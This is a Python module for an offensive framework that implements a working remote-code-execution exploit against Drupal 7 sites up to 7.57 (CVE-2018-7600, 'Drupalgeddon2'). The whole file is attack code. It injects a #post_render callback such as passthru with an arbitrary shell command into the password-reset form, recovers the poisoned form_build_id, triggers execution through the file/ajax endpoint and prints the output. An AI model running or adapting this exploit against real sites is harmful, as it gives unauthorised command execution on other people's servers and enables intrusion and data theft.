import logging
from bs4 import BeautifulSoup
from hmc.modules import Module, Argument

log = logging.getLogger("hmc")

class Drupalgeddon2(Module):
	module_name = "drupalgeddon2"
	module_desc = "RCE on Drupal 7 <= 7.57 (CVE-2018-7600)"
	module_auth = "Hatsu"

	module_args = [
		Argument("target", desc="URL of target Drupal site (ex: http://target.com/)"),
		Argument("command", "-c", "--command", default="id", desc="Command to execute (default = id)"),
		Argument("function","-f", "--function", default="passthru", desc="Function to use as attack vector (default = passthru)"),
		Argument("proxy","-x", "--proxy", default="", desc="Configure a proxy in the format http://127.0.0.1:8080/ (default = none)")
	]

	async def execute(self, target: str, command: str, function: str, proxy: str):
		log.info('[*] Poisoning a form and including it in cache.')

		get_params = {
			'q': 'user/password',
			'name[#post_render][]': function,
			'name[#type]': 'markup',
			'name[#markup]': command
		}

		post_params = {
			'form_id':'user_pass',
			'_triggering_element_name':'name',
			'_triggering_element_value':'',
			'opz':'E-mail new Password'
		}

		r = await self.env.post(target, params=get_params, data=post_params, ssl=False, proxy=proxy)
		soup = BeautifulSoup(r.body, "html.parser")

		try:
			form = soup.find('form', {'id': 'user-pass'})
			form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')

			if form_build_id:
				self.log_success('[*] Poisoned form ID: ' + form_build_id)
				self.log_success('[*] Triggering exploit to execute: ' + command)

				get_params = {'q':'file/ajax/name/#value/' + form_build_id}
				post_params = {'form_build_id':form_build_id}

				r = await self.env.post(target, params=get_params, data=post_params, ssl=False, proxy=proxy)
				parsed_result = r.body.split('[{"command":"settings"')[0]

				print(parsed_result)
				#self.log_success(parsed_result)
		except Exception as e:
			print(e)
			#self.log_failure(e)
